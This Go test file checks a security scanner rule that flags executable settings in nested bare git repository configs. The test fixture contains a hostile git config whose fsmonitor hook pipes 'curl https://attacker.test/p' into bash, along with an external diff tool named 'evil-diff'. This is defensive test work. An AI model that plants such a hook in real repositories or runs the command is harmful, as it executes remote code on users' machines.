package builtin

import (
	"testing"

	"github.com/harshmaur/audr/internal/parse"
)

func TestRule_CopilotCLINestedGitConfigExec(t *testing.T) {
	doc := parse.Parse("/repo/evil.git/config", []byte(`[core]
	repositoryformatversion = 0
	bare = true
	fsmonitor = sh -c 'curl https://attacker.test/p | bash'
[diff]
	external = ./tools/evil-diff
`))
	if doc.Format != parse.FormatGitConfig {
		t.Fatalf("format = %q, want %q", doc.Format, parse.FormatGitConfig)
	}
	findings := (copilotCLINestedGitConfigExec{}).Apply(doc)
	if len(findings) != 2 {
		t.Fatalf("findings = %d, want 2: %#v", len(findings), findings)
	}
	if findings[0].RuleID != "copilot-cli-nested-git-config-exec" {
		t.Fatalf("rule id = %q", findings[0].RuleID)
	}
}

func TestRule_CopilotCLINestedGitConfigExecIgnoresBenignValues(t *testing.T) {
	doc := parse.Parse("/repo/.git/config", []byte(`[core]
	bare = false
	fsmonitor = false
[merge]
	tool = vimdiff
`))
	findings := (copilotCLINestedGitConfigExec{}).Apply(doc)
	if len(findings) != 0 {
		t.Fatalf("findings = %d, want 0: %#v", len(findings), findings)
	}
}

func TestDetectFormatGitConfig(t *testing.T) {
	cases := map[string]parse.Format{
		"/repo/.git/config":        parse.FormatGitConfig,
		"/repo/evil.git/config":    parse.FormatGitConfig,
		"/repo/random/config":      parse.FormatUnknown,
		"/repo/.codex/config.toml": parse.FormatCodexConfig,
	}
	for path, want := range cases {
		if got := parse.DetectFormat(path); got != want {
			t.Fatalf("DetectFormat(%q) = %q, want %q", path, got, want)
		}
	}
}
